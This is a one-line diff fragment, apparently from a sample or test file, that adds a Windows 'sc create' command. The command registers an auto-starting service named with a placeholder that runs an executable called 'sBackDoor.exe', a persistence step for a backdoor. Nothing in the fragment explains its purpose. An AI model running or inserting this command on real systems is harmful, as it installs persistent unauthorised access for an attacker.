@@ -1,0 +1,1 @@
+sc create AAAAAAAAAA binpath= D:\sBackDoor.exe start= auto
